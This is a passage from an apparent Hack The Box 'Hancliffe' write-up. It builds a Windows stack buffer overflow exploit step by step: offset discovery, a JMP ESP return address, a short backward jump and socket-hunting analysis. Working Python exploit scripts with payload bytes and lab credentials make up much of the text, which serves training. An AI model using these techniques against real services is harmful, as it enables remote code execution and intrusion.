<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Metasploit</span></span>
<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="at">-l</span> 130</span>
<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Enter the cyclic pattern to your bof script <strong>payload</strong>:</p>
<div class="sourceCode" id="cb41"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a>[root:<span class="op">/</span>git<span class="op">/</span>htb<span class="op">/</span>hancliffe]<span class="co"># cat bof.py</span></span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> <span class="st">"172.30.1.118"</span></span>
<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">9519</span></span>
<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"random-data"</span></span>
<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-12"><a href="#cb41-12" aria-hidden="true" tabindex="-1"></a>prefix <span class="op">=</span> <span class="st">""</span></span>
<span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a>offset <span class="op">=</span> <span class="dv">0</span></span>
<span id="cb41-14"><a href="#cb41-14" aria-hidden="true" tabindex="-1"></a>overflow <span class="op">=</span> <span class="st">"A"</span> <span class="op">*</span> offset</span>
<span id="cb41-15"><a href="#cb41-15" aria-hidden="true" tabindex="-1"></a>retn <span class="op">=</span> <span class="st">""</span></span>
<span id="cb41-16"><a href="#cb41-16" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> <span class="st">""</span></span>
<span id="cb41-17"><a href="#cb41-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A"</span></span>
<span id="cb41-18"><a href="#cb41-18" aria-hidden="true" tabindex="-1"></a>postfix <span class="op">=</span> <span class="st">""</span></span>
<span id="cb41-19"><a href="#cb41-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-20"><a href="#cb41-20" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">=</span> prefix <span class="op">+</span> overflow <span class="op">+</span> retn <span class="op">+</span> padding <span class="op">+</span> payload <span class="op">+</span> postfix</span>
<span id="cb41-21"><a href="#cb41-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-22"><a href="#cb41-22" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb41-23"><a href="#cb41-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-24"><a href="#cb41-24" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb41-25"><a href="#cb41-25" aria-hidden="true" tabindex="-1"></a>    s.<span class="ex">connect</span>((ip, port))</span>
<span id="cb41-26"><a href="#cb41-26" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb41-27"><a href="#cb41-27" aria-hidden="true" tabindex="-1"></a>    s.send(user)</span>
<span id="cb41-28"><a href="#cb41-28" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb41-29"><a href="#cb41-29" aria-hidden="true" tabindex="-1"></a>    s.send(passwd)</span>
<span id="cb41-30"><a href="#cb41-30" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb41-31"><a href="#cb41-31" aria-hidden="true" tabindex="-1"></a>    s.send(fullname)</span>
<span id="cb41-32"><a href="#cb41-32" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb41-33"><a href="#cb41-33" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Sending evil buffer..."</span>)</span>
<span id="cb41-34"><a href="#cb41-34" aria-hidden="true" tabindex="-1"></a>    s.send(<span class="bu">buffer</span> <span class="op">+</span> <span class="st">"</span><span class="ch">\r\n</span><span class="st">"</span>)</span>
<span id="cb41-35"><a href="#cb41-35" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Done!"</span>)</span>
<span id="cb41-36"><a href="#cb41-36" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb41-37"><a href="#cb41-37" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Could not connect."</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Run the script and the application should crash:</p>
<div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> ./bof.py</span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Welcome</span> Brankas Application.</span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Username:</span> </span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> </span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Login</span> Successfully!</span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Sending</span> evil buffer...</span>
<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Done!</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><img src="images/hancliffe09.png" class="img-fluid"></p>
<p>The EIP value is now <strong>41326341</strong>. Find the exact offset of the crash with either Mona or Metasploit:</p>
<div class="sourceCode" id="cb43"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Mona</span></span>
<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a><span class="ex">!mona</span> findmsp <span class="at">-disance</span> 130</span>
<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Examining registers</span>
<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">EIP</span> contains normal pattern : 0x41326341 <span class="er">(</span><span class="ex">offset</span> 66<span class="kw">)</span></span>
<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Metasploit</span></span>
<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="at">-q</span> 41326341</span>
<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Exact match at offset 66</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Modify the <code>bof.py</code> and ..<br> .. set <strong>offset</strong> variable to 66<br> .. set <strong>retn</strong> varible to “BBBB”<br> .. clear the payload variable</p>
<div class="sourceCode" id="cb44"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> cat bof.py</span>
<span id="cb44-2"><a href="#cb44-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb44-3"><a href="#cb44-3" aria-hidden="true" tabindex="-1"></a><span class="ex">offset</span> = 66</span>
<span id="cb44-4"><a href="#cb44-4" aria-hidden="true" tabindex="-1"></a><span class="ex">overflow</span> = <span class="st">"A"</span> <span class="pp">*</span> offset</span>
<span id="cb44-5"><a href="#cb44-5" aria-hidden="true" tabindex="-1"></a><span class="ex">retn</span> = <span class="st">"BBBB"</span></span>
<span id="cb44-6"><a href="#cb44-6" aria-hidden="true" tabindex="-1"></a><span class="ex">padding</span> = <span class="st">""</span></span>
<span id="cb44-7"><a href="#cb44-7" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> = <span class="st">""</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Run <code>bof.py</code> again and the EIP should now be equal to <strong>42424242</strong>, the hex value of “BBBB”, meaning we controll EIP.<br> <img src="images/hancliffe10.png" class="img-fluid"></p>
<hr>
</section>
<section id="finding-a-jump-point" class="level4">
<h4 class="anchored" data-anchor-id="finding-a-jump-point">Finding a Jump Point</h4>
<p>To get a deeper understanding of the binary, we can change the payload to <code>'\x43' * 500</code>. This would in theory give us 500 C’s after EIP.</p>
<div class="sourceCode" id="cb45"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> <span class="st">'</span><span class="ch">\x41</span><span class="st">'</span> <span class="op">*</span> <span class="dv">66</span></span>
<span id="cb45-2"><a href="#cb45-2" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x42</span><span class="st">'</span> <span class="op">*</span> <span class="dv">4</span></span>
<span id="cb45-3"><a href="#cb45-3" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x43</span><span class="st">'</span> <span class="op">*</span> <span class="dv">500</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>If we load <code>MyFirstApp.exe</code> in x64dbg and fire the exploit, we see that at the point of crash, the stack pointer [<code>$esp</code>] is pointing to the area that directly follows the EIP overwrite - <code>0x0101FF18</code>.</p>
<p><img src="images/hancliffe12.png" class="img-fluid"></p>
<p>Although we sent a total of 500 bytes in this position, this has been heavily truncated to only 10 bytes. This is a big problem, as this won’t suffice for the operations we wish to carry out. However, we do have the full 66 byte <code>\x41</code> island that precedes the EIP overwrite at our disposal. As long as we can pass execution into the 10 byte island that follows the overwrite, we can do a short jump back into the 66 byte island.</p>
<p>As the <code>$esp</code> register is pointing at the 10 byte island, the first thing we need to do is locate an executable area of memory that contains a <code>jmp esp</code> instruction which is unaffected by ASLR so we can reliably hardcode our exploit to return to this address.</p>
<p>In <strong>x64dbg</strong>, we can do this by inspecting the <code>Memory Map</code> tab and looking at what DLLs are being used. We find 5 DLL’s; <code>msvcrt.dll</code>, <code>kernelbase.dll</code>, <code>kernel32.dll</code>, <code>ws2_32.dll</code> &amp; <code>ntdll.dll</code>. Take note of their respective base address, go to <code>Log</code> and run the command <code>imageinfo &lt;base-dll-address&gt;</code> to retrieve information from the PE header. If the <code>DLL Characteristics</code> flag is set to 0, no protection such as ASLR or DEP are enabled.</p>
<blockquote class="blockquote">
<p>This step can also be done in Immunity using Mona and is <strong>much simpler</strong>, just write: <code>!mona modules</code></p>
<p><img src="images/hancliffe13.png" class="img-fluid"></p>
</blockquote>
<p>Unfortunate for us, all DLL’s are protected and we have to bypass ASLR somehow. We have two options..</p>
<p>.. find a JMP ESP within the EXE itself.<br> .. create your own malicious DLL and inject it into the program.</p>
<p>The easiest of the two would be to find a jump point within the EXE, so lets go with that.</p>
<p>In <strong>x64dbg</strong> go to <code>Memory Map</code> tab and double click on the memory section marked as executable (<code>E</code> in Protection column) for myfirstapp.exe; <code>.text</code> in this case.</p>
<p><img src="images/hancliffe14.png" class="img-fluid"></p>
<p>We are sent to the <code>CPU</code> tab, here press <code>CTRL+F</code> and search for <code>JMP ESP</code> and we find 5 jump points. <img src="images/hancliffe15.png" class="img-fluid"></p>
<blockquote class="blockquote">
<p>This can also be done in Immunity using Mona by writing: <code>!mona jmp -r esp -cpb "\x00"</code></p>
<p><img src="images/hancliffe16.png" class="img-fluid"></p>
</blockquote>
<p>Save the first address, <code>0x7190239F</code>. Now that we have an address of a <code>jmp esp</code> instruction that will take us to the 10 byte island after the EIP overwrite, we can replace <code>\x42\x42\x42\x42</code> in our exploit with said address (keep in mind, this needs to be in reverse order due to the use of little endian).</p>
<p>Our updated code should now look like this:</p>
<div class="sourceCode" id="cb46"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> <span class="st">"172.30.1.118"</span></span>
<span id="cb46-7"><a href="#cb46-7" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">9062</span></span>
<span id="cb46-8"><a href="#cb46-8" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb46-9"><a href="#cb46-9" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb46-10"><a href="#cb46-10" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"random-data"</span></span>
<span id="cb46-11"><a href="#cb46-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-12"><a href="#cb46-12" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> <span class="st">'</span><span class="ch">\x41</span><span class="st">'</span> <span class="op">*</span> <span class="dv">66</span></span>
<span id="cb46-13"><a href="#cb46-13" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x9F\x23\x90\x71</span><span class="st">'</span></span>
<span id="cb46-14"><a href="#cb46-14" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x43</span><span class="st">'</span> <span class="op">*</span> <span class="dv">500</span></span>
<span id="cb46-15"><a href="#cb46-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-16"><a href="#cb46-16" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb46-17"><a href="#cb46-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-18"><a href="#cb46-18" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb46-19"><a href="#cb46-19" aria-hidden="true" tabindex="-1"></a>    s.<span class="ex">connect</span>((ip, port))</span>
<span id="cb46-20"><a href="#cb46-20" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb46-21"><a href="#cb46-21" aria-hidden="true" tabindex="-1"></a>    s.send(user)</span>
<span id="cb46-22"><a href="#cb46-22" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb46-23"><a href="#cb46-23" aria-hidden="true" tabindex="-1"></a>    s.send(passwd)</span>
<span id="cb46-24"><a href="#cb46-24" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb46-25"><a href="#cb46-25" aria-hidden="true" tabindex="-1"></a>    s.send(fullname)</span>
<span id="cb46-26"><a href="#cb46-26" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb46-27"><a href="#cb46-27" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Sending evil buffer..."</span>)</span>
<span id="cb46-28"><a href="#cb46-28" aria-hidden="true" tabindex="-1"></a>    s.send(b)</span>
<span id="cb46-29"><a href="#cb46-29" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Done!"</span>)</span>
<span id="cb46-30"><a href="#cb46-30" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb46-31"><a href="#cb46-31" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Could not connect."</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Before running the exploit again, set a breakpoint at our <code>jmp esp</code> instruction. Do so by going to the <code>CPU</code> tab, press <code>CTRL+G</code> and enter the address <code>7190239F</code>. Toggle a breakpoint by pressing F2, or use any of the menus - once breakpoint is applied the address field should turn red.</p>
<p>If we now run the exploit again, we will hit the breakpoint and after stepping into the call (blue arrow pointing down on a dot), we will be taken to our 10 byte island of <code>0x43</code>, meaning we control execution.</p>
<p><img src="images/hancliffe17.png" class="img-fluid"></p>
<p>Next we need to jump back to the start of the 66 byte island as mentioned earlier. To do this, we can use a short jump to go backwards. Rather than calculating the exact offset manually, x64dbg can do the heavy lifting for us here!</p>
<p>If we scroll up the <code>CPU</code> tab to find the start of the 66 byte island containing the <code>\x41</code> bytes, we can see there is a <code>0x41</code> at <code>0x00FCFED4</code> and also two which directly precede that.</p>
<p><img src="images/hancliffe18.png" class="img-fluid"></p>
<p>We cannot copy the address of the first 2 bytes, but we can instead subtract 2 bytes from <code>0x00FCFED4</code> to get the address <code>0x00FCFED2</code>. Now, if we go back to where <code>$esp</code> is pointing (<code>0x00FCFF15</code>) and press the space bar whilst the instruction is highlighted, we will enter the <code>Assemble</code> screen.</p>
<p>In here, we can enter <code>jmp 0x00FCFED2</code>, hit <code>OK</code> and it will automatically calculate the distance and create a short jump for us; in this case, <code>EB BB</code>. If everything went correct you should now have a red arrow pointing up to the start of the <code>\x41</code> island. You can also verify this by pressing <code>G</code>.</p>
<p><img src="images/hancliffe19.png" class="img-fluid"></p>
<p>We can now update the exploit to include this instruction before the <code>\x43</code> island that was previously in place and replace the remaining bytes in both the 66 byte and 10 byte islands with NOP sleds so that we can work with them a bit easier later when we are assembling our exploit in the debugger.</p>
<p>After making these changes, the exploit should look like this:</p>
<div class="sourceCode" id="cb47"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb47-3"><a href="#cb47-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb47-4"><a href="#cb47-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb47-5"><a href="#cb47-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb47-6"><a href="#cb47-6" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> <span class="st">"172.30.1.118"</span></span>
<span id="cb47-7"><a href="#cb47-7" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">9683</span></span>
<span id="cb47-8"><a href="#cb47-8" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb47-9"><a href="#cb47-9" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb47-10"><a href="#cb47-10" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"random-data"</span></span>
<span id="cb47-11"><a href="#cb47-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb47-12"><a href="#cb47-12" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="dv">66</span>                     <span class="co"># buffer</span></span>
<span id="cb47-13"><a href="#cb47-13" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x9F\x23\x90\x71</span><span class="st">'</span>             <span class="co"># jmp esp ; within the exe</span></span>
<span id="cb47-14"><a href="#cb47-14" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\xEB\xBB</span><span class="st">'</span>                     <span class="co"># jmp 0x00FCFED2 ; start of \x41 island</span></span>
<span id="cb47-15"><a href="#cb47-15" aria-hidden="true" tabindex="-1"></a>b <span class="op">+=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="dv">500</span>                   <span class="co"># NOP sleds</span></span>
<span id="cb47-16"><a href="#cb47-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb47-17"><a href="#cb47-17" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb47-18"><a href="#cb47-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb47-19"><a href="#cb47-19" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb47-20"><a href="#cb47-20" aria-hidden="true" tabindex="-1"></a>    s.<span class="ex">connect</span>((ip, port))</span>
<span id="cb47-21"><a href="#cb47-21" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb47-22"><a href="#cb47-22" aria-hidden="true" tabindex="-1"></a>    s.send(user)</span>
<span id="cb47-23"><a href="#cb47-23" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb47-24"><a href="#cb47-24" aria-hidden="true" tabindex="-1"></a>    s.send(passwd)</span>
<span id="cb47-25"><a href="#cb47-25" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb47-26"><a href="#cb47-26" aria-hidden="true" tabindex="-1"></a>    s.send(fullname)</span>
<span id="cb47-27"><a href="#cb47-27" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(s.recv(<span class="dv">1024</span>))</span>
<span id="cb47-28"><a href="#cb47-28" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Sending evil buffer..."</span>)</span>
<span id="cb47-29"><a href="#cb47-29" aria-hidden="true" tabindex="-1"></a>    s.send(b)</span>
<span id="cb47-30"><a href="#cb47-30" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Done!"</span>)</span>
<span id="cb47-31"><a href="#cb47-31" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb47-32"><a href="#cb47-32" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Could not connect."</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>If we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite:<br> <img src="images/hancliffe20.png" class="img-fluid"></p>
<hr>
</section>
<section id="analysis-socket-hunting" class="level4">
<h4 class="anchored" data-anchor-id="analysis-socket-hunting">Analysis &amp; Socket Hunting</h4>
<p>The first thing we need to do before we can start putting together any code is to figure out where we can <strong>find the socket</strong> that the data our exploit is sending is being received on. Restart the application and set a break point at the either the <code>recv</code> or <code>call eax</code> funtions under the string <code>Input Your Code:</code>, in my case that is <code>0x71901D79</code>.</p>
<p><img src="images/hancliffe21.png" class="img-fluid"></p>
<p>At the breakpoint we can see a few interesting things;</p>
<ol type="1">
<li>The <code>recv</code> function ontop of the stack, as seen in the red box on the right.</li>
</ol>
<p>Looking on <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-recv">these Windows Docs</a> we see that the <code>recv</code> function looks like this:</p>
<div class="sourceCode" id="cb48"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> recv<span class="op">(</span></span>
<span id="cb48-2"><a href="#cb48-2" aria-hidden="true" tabindex="-1"></a>  SOCKET s<span class="op">,</span></span>
<span id="cb48-3"><a href="#cb48-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span>   <span class="op">*</span>buf<span class="op">,</span></span>
<span id="cb48-4"><a href="#cb48-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span>    len<span class="op">,</span></span>
<span id="cb48-5"><a href="#cb48-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span>    flags</span>
<span id="cb48-6"><a href="#cb48-6" aria-hidden="true" tabindex="-1"></a><span class="op">);</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<ul>
<li>The first argument (on the top of the stack) is the <strong>socket</strong> file descriptor; in this, case the value <code>0x130</code></li>
<li>The second argument is the <strong>buffer</strong>, i.e.&nbsp;a pointer to the area of memory that the data received via the socket will be stored. In this case, it will store the received data at <code>0x653C20</code></li>
<li>The third argument is the <strong>amount</strong> of data to expect. This has been set at <code>0x400</code> bytes (1024 bytes)</li>
<li>The final argument is the flags that influence the behaviour of the function. As the default behaviour is being used, this is set to <code>0</code></li>
</ul>
<ol start="2" type="1">
<li>We can also see just above the breakpoint <code>ebp-10</code> is moved to <code>eax</code>, and on the next instruction <code>eax</code> is moved onto the stack. This means that the socket descriptor is contained at <code>ebp-10</code>. We can confirm this in by searching for the address of <code>ebp-10</code> (<code>0x00eeff60</code>) in the Dump tabs. This gives us a way to <strong>dynamically retrive the socket</strong> descriptor for our payload.</li>
</ol>
<p>To get the offset calculate <code>00eeff60</code> (<code>ebp-10</code>) - <code>00eeff18</code> (<code>esp</code>) = <code>0x48</code></p>
<ol start="3" type="1">
<li><p>For future referenses we also need to grab the address of the <code>recv</code> function. We find this value by either double clicking <code>call</code> or by looking at <code>eax</code> in the top right corner - <code>0x7323a0</code>.</p></li>
<li><p>If you press <strong>Step over</strong> from the breakpoint you’ll land on the next instruction (<code>sub esp,10</code>). Here you can confirm that your input data are in the buffer by searching for the buffer address (<code>0x653c20</code>) in the Dump tabs.</p></li>
</ol>
<p><strong>NOTE</strong> : This last step has to be done quickly. If the value of <code>EAX</code> is set to <code>FFFFFFFF</code> (<code>SOCKET_ERROR</code>) when you reach <code>sub esp,10</code> that means you were to slow and the socket has closed.</p>
<hr>
</section>
<section id="writing-the-socket-stager" class="level4">
<h4 class="anchored" data-anchor-id="writing-the-socket-stager">Writing the Socket Stager</h4>
<p><strong>Disclaimer:</strong> When finalizing this exploit at home the values of my binary differ from the one I had at work thus making some of the values different, although the calculation to get there are still the same. My distance for example is <strong>not</strong> <code>0x48</code> but instead <code>0x70</code>. Also, the <code>recv</code> address changed from <code>0x76b323a0</code> to <code>0x75dc23a0</code>.</p>
<p>Following the guidlines from <a href="https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/">rastating</a> we should get something like this:</p>
<div class="sourceCode" id="cb49"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> esp                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>54</span>
<span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a><span class="ex">pop</span> eax                     <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>58</span>
